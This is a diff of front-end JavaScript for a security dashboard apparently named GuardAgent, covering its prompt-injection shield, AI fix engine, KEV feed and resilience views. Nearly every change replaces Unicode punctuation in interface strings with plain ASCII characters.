       <div class="f-desc">${esc(h.desc)}</div>${h.span?`<div class="f-code">${esc(h.span)}</div>`:''}</div>`).join('')
-      :'<div class="card" style="text-align:center;color:var(--ok)">✓ Content is clean — safe to pass to the agent.</div>'}</div>
+      :'<div class="card" style="text-align:center;color:var(--ok)">✓ Content is clean - safe to pass to the agent.</div>'}</div>
     ${res.sanitized!=null?`<div class="card mt"><h3>Sanitized copy (safe to forward)</h3><div class="f-code" style="white-space:pre-wrap">${esc(res.sanitized)}</div></div>`:''}`;
 }
 async function runShield(){
   const src=$('#shield-input').value,out=$('#shield-out');
-  if(!src.trim()){out.innerHTML=emptyShield();toast('Nothing to screen — paste content first.');return;}
-  const btn=$('#shield-btn');btn.disabled=true;btn.textContent='Screening…';
-  out.innerHTML=`<div class="card" style="display:grid;place-items:center;min-height:340px"><div style="text-align:center"><div class="badge b-accent pulse">screening for prompt injection</div><p class="dim" style="margin-top:10px;font-size:.75rem">hijack → exfil → smuggling → tool-abuse → persona → recon</p></div></div>`;
+  if(!src.trim()){out.innerHTML=emptyShield();toast('Nothing to screen - paste content first.');return;}
+  const btn=$('#shield-btn');btn.disabled=true;btn.textContent='Screening...';
+  out.innerHTML=`<div class="card" style="display:grid;place-items:center;min-height:340px"><div style="text-align:center"><div class="badge b-accent pulse">screening for prompt injection</div><p class="dim" style="margin-top:10px;font-size:.75rem">hijack -> exfil -> smuggling -> tool-abuse -> persona -> recon</p></div></div>`;
   try{
     const resp=await fetch('/api/shield',{method:'POST',headers:{'Content-Type':'application/json'},
       body:JSON.stringify({content:src,source:$('#shield-source').value})});
     if(!resp.ok)throw new Error('backend '+resp.status);
     const res=await resp.json();
     renderShield(res);
-    toast('Shield verdict: '+res.verdict+(res.verdict==='BLOCK'?' — content withheld from agent.':'.'));
+    toast('Shield verdict: '+res.verdict+(res.verdict==='BLOCK'?' - content withheld from agent.':'.'));
   }catch(err){
-    out.innerHTML=`<div class="card" style="text-align:center;color:var(--warn)">Backend offline — start the platform (uvicorn) to use the live Prompt Shield.</div>`;
+    out.innerHTML=`<div class="card" style="text-align:center;color:var(--warn)">Backend offline - start the platform (uvicorn) to use the live Prompt Shield.</div>`;
   }
   btn.disabled=false;btn.textContent='🛡 Screen content';
 }
@@ -1318,24 +1318,24 @@ function renderFix(analysis,fix){
   out.innerHTML=`
     <div class="verdict v-allow"><span class="v-badge">FIX</span>
       <div><div style="font-weight:600;font-size:.88rem">${esc(fix.summary||'Remediation generated')}</div>
-      <div class="dim" style="font-size:.74rem;margin-top:3px">${(fix.changes||[]).length} change${(fix.changes||[]).length!==1?'s':''} · residual risk ${esc(fix.residual_risk||'?')} · engine ${esc(fix.engine||'deterministic')}</div></div></div>
+      <div class="dim" style="font-size:.74rem;margin-top:3px">${(fix.changes||[]).length} change${(fix.changes||[]).length!==1?'s':''} -  residual risk ${esc(fix.residual_risk||'?')} -  engine ${esc(fix.engine||'deterministic')}</div></div></div>
     ${fix.fixed_code?`<div class="card" style="margin-bottom:12px"><h3>Remediated code</h3>
-      <div style="display:flex;gap:8px;margin-bottom:8px"><button class="btn ghost sm" onclick="applyFix()">↧ Load into editor</button><button class="btn ghost sm" onclick="copyFix()">⧉ Copy</button></div>
+      <div style="display:flex;gap:8px;margin-bottom:8px"><button class="btn ghost sm" onclick="applyFix()"> Load into editor</button><button class="btn ghost sm" onclick="copyFix()">⧉ Copy</button></div>
       <div class="f-code" id="fixed-code" style="white-space:pre-wrap;max-height:320px;overflow:auto">${esc(fix.fixed_code)}</div></div>`:''}
     <div>${(fix.changes||[]).map(c=>`<div class="finding sev-medium">
       <div class="f-head"><span class="f-name">${esc(c.finding_id||'change')}</span>${c.line?`<span class="f-line">line ${c.line}</span>`:''}</div>
       <div class="f-desc">${esc(c.explanation||'')}</div>
-      ${c.before?`<div class="f-code" style="color:var(--crit)">− ${esc(c.before)}</div>`:''}
+      ${c.before?`<div class="f-code" style="color:var(--crit)">- ${esc(c.before)}</div>`:''}
       ${c.after?`<div class="f-code" style="color:var(--ok)">+ ${esc(c.after)}</div>`:''}</div>`).join('')}</div>`;
 }
 window._lastFix=null;
-function applyFix(){if(window._lastFix){$('#code-input').value=window._lastFix;toast('Remediated code loaded — re-run analysis to confirm it is clean.');}}
+function applyFix(){if(window._lastFix){$('#code-input').value=window._lastFix;toast('Remediated code loaded - re-run analysis to confirm it is clean.');}}
 function copyFix(){if(window._lastFix){navigator.clipboard&&navigator.clipboard.writeText(window._lastFix);toast('Remediated code copied to clipboard.');}}
 async function runFix(){
   const src=$('#code-input').value,out=$('#inspect-out');
   if(!src.trim()){out.innerHTML=emptyInspect();toast('Paste code to remediate first.');return;}
-  const btn=$('#fix-btn');btn.disabled=true;btn.textContent='Generating…';
-  out.innerHTML=`<div class="card" style="display:grid;place-items:center;min-height:340px"><div style="text-align:center"><div class="badge b-accent pulse">GPT-5.6 remediating findings</div><p class="dim" style="margin-top:10px;font-size:.75rem">analyze → rewrite → verify residual risk</p></div></div>`;
+  const btn=$('#fix-btn');btn.disabled=true;btn.textContent='Generating...';
+  out.innerHTML=`<div class="card" style="display:grid;place-items:center;min-height:340px"><div style="text-align:center"><div class="badge b-accent pulse">GPT-5.6 remediating findings</div><p class="dim" style="margin-top:10px;font-size:.75rem">analyze -> rewrite -> verify residual risk</p></div></div>`;
   try{
     const resp=await fetch('/api/fix',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code:src})});
     if(!resp.ok)throw new Error('backend '+resp.status);
@@ -1344,7 +1344,7 @@ async function runFix(){
     renderFix(j.analysis,j.fix);
     toast('Fix generated ('+(j.fix.changes||[]).length+' changes, '+j.fix.residual_risk+' residual risk).');
   }catch(err){
-    out.innerHTML=`<div class="card" style="text-align:center;color:var(--warn)">Backend offline — start the platform (uvicorn) to use the AI Fix Engine.</div>`;
+    out.innerHTML=`<div class="card" style="text-align:center;color:var(--warn)">Backend offline - start the platform (uvicorn) to use the AI Fix Engine.</div>`;
   }
   btn.disabled=false;btn.textContent='✚ Generate AI fix';
 }
@@ -1359,15 +1359,15 @@ async function runFix(){
   es.addEventListener('scan',e=>{const d=JSON.parse(e.data);flash('◍ SCAN '+(d.decision||'').toUpperCase());bumpPosture();});
   es.addEventListener('shield',e=>{const d=JSON.parse(e.data);flash('🛡 SHIELD '+(d.verdict||''));bumpPosture();});
   es.addEventListener('action',e=>{const d=JSON.parse(e.data);flash('⚙ AGENT '+(d.outcome||'').toUpperCase());bumpPosture();});
-  es.onerror=()=>{/* backend offline / static demo — silently ignore */};
+  es.onerror=()=>{/* backend offline / static demo - silently ignore */};
 })();
 
 /* ---------- gates ---------- */
 function renderGates(){
-  const ico={passed:'✓',warned:'!',blocked:'✕',review:'👁',quarantined:'☣',pending:'·'};
+  const ico={passed:'✓',warned:'!',blocked:'✕',review:'👁',quarantined:'☣',pending:' - '};
   const stat={passed:'b-ok',warned:'b-med',blocked:'b-crit',review:'b-low',quarantined:'b-quar'};
   $('#pipes').innerHTML=DB.pipelines.map(p=>`<div class="pipe">
-    <div class="pipe-head"><span class="p-name">${p.name}</span><span class="p-meta">${p.id} · ${p.trigger}</span>
+    <div class="pipe-head"><span class="p-name">${p.name}</span><span class="p-meta">${p.id} -  ${p.trigger}</span>
       <span class="badge ${stat[p.status]}" style="margin-left:auto">${p.status.toUpperCase()}</span></div>
     <div class="stages">${p.stages.map(([n,s],i)=>`${i?'<span class="s-link"></span>':''}<div class="stage ${s}"><div class="s-dot">${ico[s]}</div><div class="s-name">${n}</div></div>`).join('')}</div>
     <div class="pipe-reason">${p.reason}</div></div>`).join('');
@@ -1402,23 +1402,23 @@ let KEV={entries:[],counts:{},filter:'all'};
 const KEV_ENGINE={mssql:'SQL Server / MS',oracle:'Oracle DB / stack',mysql:'MySQL / MariaDB',os:'OS / hypervisor'};
 async function renderKEV(force){
   const feed=$('#kev-feed'),src=$('#kev-src');
-  if(force){feed.innerHTML='<div class="dim" style="padding:20px;text-align:center">Refreshing from CISA…</div>';src.textContent='refreshing…';}
+  if(force){feed.innerHTML='<div class="dim" style="padding:20px;text-align:center">Refreshing from CISA...</div>';src.textContent='refreshing...';}
   try{
     const r=await fetch('/api/kev?limit=60'+(force?'&_='+Date.now():''),{signal:AbortSignal.timeout(18000)});
     if(!r.ok)throw new Error('backend '+r.status);
     const d=await r.json();
     if(!d.ok)throw new Error(d.error||'feed error');
     KEV.entries=d.entries;KEV.counts=d.counts;
-    src.innerHTML=`catalog v${esc(d.catalogVersion||'?')} · ${d.total} CVEs · ${KEV.counts.ransomware||0} ransomware-linked${d.stale?' · <span style="color:var(--warn)">cached</span>':''} · source CISA KEV`;
+    src.innerHTML=`catalog v${esc(d.catalogVersion||'?')} -  ${d.total} CVEs -  ${KEV.counts.ransomware||0} ransomware-linked${d.stale?' -  <span style="color:var(--warn)">cached</span>':''} -  source CISA KEV`;
     // engine tiles
     const tiles=[['mssql','var(--crit)'],['oracle','var(--warn)'],['mysql','var(--accent)'],['os','#a878ff']];
     $('#kev-tiles').innerHTML=tiles.map(([k,c])=>`<div class="kpi"><div class="k-label">${KEV_ENGINE[k]}</div>
       <div class="k-value" style="color:${c}">${KEV.counts[k]??0}</div>
-      <div class="k-delta dim">KEV entries · ${k==='os'?'12 mo':'12 mo'}</div></div>`).join('');
+      <div class="k-delta dim">KEV entries -  ${k==='os'?'12 mo':'12 mo'}</div></div>`).join('');
     drawKEVFeed();
   }catch(e){
-    // offline / static file — fall back to the curated demo KEV list
-    src.innerHTML='<span style="color:var(--warn)">backend offline</span> · showing curated sample';
+    // offline / static file - fall back to the curated demo KEV list
+    src.innerHTML='<span style="color:var(--warn)">backend offline</span> -  showing curated sample';
     $('#kev-tiles').innerHTML=[['SQL Server / MS',6,'var(--crit)'],['Oracle DB / stack',8,'var(--warn)'],['MySQL / MariaDB',3,'var(--accent)'],['OS / hypervisor',14,'#a878ff']]
       .map(([n,v,c])=>`<div class="kpi"><div class="k-label">${n}</div><div class="k-value" style="color:${c}">${v}</div><div class="k-delta dim">curated sample</div></div>`).join('');
     KEV.entries=DB.kev.map(k=>({cve:k.cve,vendor:k.asset,product:'',name:k.note,desc:k.note,dateAdded:'',dueDate:'',cat:k.sev==='crit'?'db':'os',ransomware:/ransom/i.test(k.tag),fresh:false}));
@@ -1440,14 +1440,14 @@ function drawKEVFeed(){
     return `<div class="exp-row" style="border-left:3px solid ${ec};padding-left:10px">
       <div style="flex:1;min-width:0">
         <div style="font-size:.8rem;display:flex;gap:8px;align-items:center;flex-wrap:wrap">
-          <a class="mono" style="color:var(--warn)" href="https://nvd.nist.gov/vuln/detail/${encodeURIComponent(e.cve||'')}" target="_blank" rel="noopener">${esc(e.cve||'—')}</a>
-          <b>${esc(e.vendor||'')}${e.product?' · '+esc(e.product):''}</b>
+          <a class="mono" style="color:var(--warn)" href="https://nvd.nist.gov/vuln/detail/${encodeURIComponent(e.cve||'')}" target="_blank" rel="noopener">${esc(e.cve||' - ')}</a>
+          <b>${esc(e.vendor||'')}${e.product?' -  '+esc(e.product):''}</b>
           ${e.ransomware?'<span class="badge b-crit">☠ RANSOMWARE</span>':''}
           ${e.fresh?'<span class="badge b-med">★ NEW</span>':''}
           <span class="badge ${e.cat==='db'?'b-accent':e.cat==='os'?'b-quar':'b-neutral'}">${e.cat==='db'?'DATABASE':e.cat==='os'?'OS / INFRA':'OTHER'}</span>
         </div>
         <div class="dim" style="font-size:.72rem;margin-top:3px">${esc(e.desc||e.name||'')}</div>
-        ${e.dueDate?`<div class="dim mono" style="font-size:.68rem;margin-top:2px">added ${esc(e.dateAdded||'')} · remediation due ${esc(e.dueDate)}</div>`:''}
+        ${e.dueDate?`<div class="dim mono" style="font-size:.68rem;margin-top:2px">added ${esc(e.dateAdded||'')} -  remediation due ${esc(e.dueDate)}</div>`:''}
       </div></div>`;
   }).join('');
   drawKEVList();
@@ -1459,7 +1459,7 @@ function drawKEVList(){
   const list=(withDue.length?withDue:ransom).slice(0,8);
   if(!list.length){el.innerHTML='<div class="dim" style="font-size:.75rem">No ransomware-linked KEV entries in the current catalog window.</div>';return;}
   el.innerHTML=list.map(e=>`<div class="exp-row"><div style="flex:1;min-width:0">
-    <div style="font-size:.78rem"><a class="mono" style="color:var(--warn)" href="https://nvd.nist.gov/vuln/detail/${encodeURIComponent(e.cve||'')}" target="_blank" rel="noopener">${esc(e.cve||'—')}</a> · ${esc(e.vendor||'')}</div>
+    <div style="font-size:.78rem"><a class="mono" style="color:var(--warn)" href="https://nvd.nist.gov/vuln/detail/${encodeURIComponent(e.cve||'')}" target="_blank" rel="noopener">${esc(e.cve||' - ')}</a> -  ${esc(e.vendor||'')}</div>
     <div class="dim" style="font-size:.7rem;margin-top:2px">${esc((e.desc||e.name||'').slice(0,110))}</div></div>
     <span class="badge b-crit" style="white-space:nowrap">${e.dueDate?'due '+esc(e.dueDate):'☠'}</span></div>`).join('');
 }
@@ -1471,7 +1471,7 @@ document.addEventListener('click',e=>{
 
 function renderNist(){
   $('#nist-band').innerHTML=DB.nistFns.map(f=>{const col=f.score>=80?'var(--ok)':f.score>=68?'var(--warn)':'var(--crit)';
-    return `<div class="nist-fn"><div class="n-code">CSF 2.0 · ${f.code}</div><div class="n-name">${f.name}</div><div class="n-score" style="color:${col}">${f.score}</div><div class="n-open">${f.open} open item${f.open!==1?'s':''}</div></div>`;}).join('');
+    return `<div class="nist-fn"><div class="n-code">CSF 2.0 -  ${f.code}</div><div class="n-name">${f.name}</div><div class="n-score" style="color:${col}">${f.score}</div><div class="n-open">${f.open} open item${f.open!==1?'s':''}</div></div>`;}).join('');
   $('#nist-table tbody').innerHTML=DB.nistRows.map(r=>`<tr onclick="toast('Finding record opened: ${r.evidence} (demo).')">
     <td>${r.finding}</td><td><span class="badge b-accent">${r.fn}</span></td><td style="font-size:.75rem" class="muted">${r.cat}</td>
     <td>${r.owner}</td><td style="font-size:.75rem" class="${r.sla.includes('overdue')?'k-down':'muted'}">${r.sla}</td>
@@ -1509,7 +1509,7 @@ document.querySelectorAll('table').forEach(tbl=>{
 });
 
 /* ---------- navigation / shell ---------- */
-const TITLES={dashboard:'Executive Dashboard',triage:'Commit Risk Triage',inspect:'AI Code Inspection',shield:'Prompt-Injection Shield',gates:'Pipeline Gate Center',agents:'Agent Security Console',exposure:'Threat & Exposure Watch',nist:'NIST Governance Center',resilience:'Resilience Maturity — ORMA',audit:'Evidence & Audit Trail',help:'Help & Docs'};
+const TITLES={dashboard:'Executive Dashboard',triage:'Commit Risk Triage',inspect:'AI Code Inspection',shield:'Prompt-Injection Shield',gates:'Pipeline Gate Center',agents:'Agent Security Console',exposure:'Threat & Exposure Watch',nist:'NIST Governance Center',resilience:'Resilience Maturity - ORMA',audit:'Evidence & Audit Trail',help:'Help & Docs'};
 function go(view){
   document.querySelectorAll('.view').forEach(v=>v.classList.remove('active'));
   document.querySelectorAll('.nav a').forEach(a=>a.classList.toggle('active',a.dataset.view===view));
@@ -1544,7 +1544,7 @@ function tick(){
 }
 setInterval(tick,1000);tick();
 
-/* global search — filters triage table as a demo */
+/* global search - filters triage table as a demo */
 $('#global-search').addEventListener('input',e=>{
   const q=e.target.value.toLowerCase();
   if(!q)return renderTriage();
@@ -1576,11 +1576,11 @@ function renderHelp(){
   // live engine / Gemini status
   const box=$('#help-engine');
   fetch('/health',{signal:AbortSignal.timeout(2500)}).then(r=>r.ok?r.json():Promise.reject()).then(h=>{
-    box.innerHTML=`<div>Backend: <b style="color:var(--ok)">connected</b> · model <span class="mono">${h.model}</span></div>
+    box.innerHTML=`<div>Backend: <b style="color:var(--ok)">connected</b> -  model <span class="mono">${h.model}</span></div>
       <div>Gemini reasoning: <b style="color:${h.gemini?'var(--ok)':'var(--warn)'}">${h.gemini?'LIVE':'deterministic fallback (no key set)'}</b></div>
-      <div>Scans recorded: <b>${h.scans}</b> · blocked: <b>${h.blocked}</b> · agent actions: <b>${h.agent_actions}</b> · denied: <b>${h.denied}</b></div>`;
+      <div>Scans recorded: <b>${h.scans}</b> -  blocked: <b>${h.blocked}</b> -  agent actions: <b>${h.agent_actions}</b> -  denied: <b>${h.denied}</b></div>`;
   }).catch(()=>{
-    box.innerHTML=`<div>Backend: <b style="color:var(--warn)">not connected</b> — running as a static file.</div>
+    box.innerHTML=`<div>Backend: <b style="color:var(--warn)">not connected</b> - running as a static file.</div>
       <div>The Inspection studio uses the in-browser analyzer; verdicts are computed locally and not persisted.</div>
       <div style="color:var(--txt3);margin-top:4px">Serve with <span class="mono">uvicorn backend.main:app</span> to enable Gemini + audit persistence.</div>`;
   });
@@ -1598,13 +1598,13 @@ function ormaLevel(d){return 1+ormaState[d.id].filter(Boolean).length;} // 3 cri
 const ORMA_COL=l=>l>=4?'var(--ok)':l>=3?'var(--accent)':l>=2?'var(--warn)':'var(--crit)';
 function toggleOrma(did,idx){
   const d=DB.orma.find(x=>x.id===did);ormaState[did][idx]=!ormaState[did][idx];ormaSave();renderResilience();
-  toast(`${d.id} ${d.name} → level ${ormaLevel(d)}/5 (${DB.ormaLevels[ormaLevel(d)-1].name})`);
+  toast(`${d.id} ${d.name} -> level ${ormaLevel(d)}/5 (${DB.ormaLevels[ormaLevel(d)-1].name})`);
 }
 function resetOrma(){DB.orma.forEach(d=>ormaState[d.id]=d.tests.map(()=>false));ormaSave();renderResilience();toast('Assessment reset.');}
 function exportOrma(){
   const rows=DB.orma.map(d=>({domain:d.name,en:d.en,nist:d.nist,level:ormaLevel(d),levelName:DB.ormaLevels[ormaLevel(d)-1].name,target:d.target,gap:Math.max(0,d.target-ormaLevel(d)),criteriaMet:ormaState[d.id].filter(Boolean).length+'/'+d.tests.length}));
   const avg=(DB.orma.reduce((s,d)=>s+ormaLevel(d),0)/DB.orma.length);
-  const payload={framework:'ORMA — Operational Resilience Maturity',generated:new Date().toISOString(),overallMaturity:+avg.toFixed(2),domains:rows};
+  const payload={framework:'ORMA - Operational Resilience Maturity',generated:new Date().toISOString(),overallMaturity:+avg.toFixed(2),domains:rows};
   const blob=new Blob([JSON.stringify(payload,null,2)],{type:'application/json'}),u=URL.createObjectURL(blob),a=document.createElement('a');
   a.href=u;a.download='guardagent-resilience-maturity.json';a.click();URL.revokeObjectURL(u);
   toast('Resilience assessment exported.');
@@ -1629,11 +1629,11 @@ function renderResilience(){
       <div style="display:flex;gap:10px;align-items:baseline;flex-wrap:wrap">
         <b style="font-size:.9rem">${esc(d.name)}</b><span class="dim" style="font-size:.72rem">${esc(d.en)}</span>
         <span class="badge b-neutral mono" style="margin-left:auto">${esc(d.nist)}</span>
-        <span class="badge" style="background:color-mix(in srgb,${col} 18%,transparent);color:${col};border:1px solid ${col}">L${lv} · ${esc(DB.ormaLevels[lv-1].name)}</span>
+        <span class="badge" style="background:color-mix(in srgb,${col} 18%,transparent);color:${col};border:1px solid ${col}">L${lv} -  ${esc(DB.ormaLevels[lv-1].name)}</span>
       </div>
       <div style="display:flex;gap:4px;margin:10px 0 8px">${pills}</div>
       <div style="display:flex;justify-content:space-between;font-size:.72rem" class="dim">
-        <span>Target: L${d.target} · ${esc(DB.ormaLevels[d.target-1].name)}</span>
+        <span>Target: L${d.target} -  ${esc(DB.ormaLevels[d.target-1].name)}</span>
         <span style="color:${gap?'var(--crit)':'var(--ok)'}">${gap?('gap '+gap+' level'+(gap>1?'s':'')):'✓ target met'}</span>
       </div>
       <div class="orma-tests">${tests}</div>
@@ -1649,7 +1649,7 @@ function renderResilience(){
     const next=x.d.tests.findIndex((t,i)=>!ormaState[x.d.id][i]);
     return `<div style="padding:8px 0;border-bottom:1px solid var(--line)">
       <div style="font-size:.8rem"><b>${esc(x.d.name)}</b> <span class="badge b-crit">+${x.gap}</span></div>
-      <div class="dim" style="font-size:.72rem;margin-top:2px">L${x.lv} → L${x.d.target}. Next: ${next>=0?esc(x.d.tests[next]):'validate & optimise'}</div></div>`;
+      <div class="dim" style="font-size:.72rem;margin-top:2px">L${x.lv} -> L${x.d.target}. Next: ${next>=0?esc(x.d.tests[next]):'validate & optimise'}</div></div>`;
   }).join(''):'<div style="color:var(--ok);font-size:.8rem;text-align:center;padding:14px">✓ All domains meet their resilience target.</div>';
 
   const oa=$('#orma-badge');if(oa)oa.textContent=avg.toFixed(1);
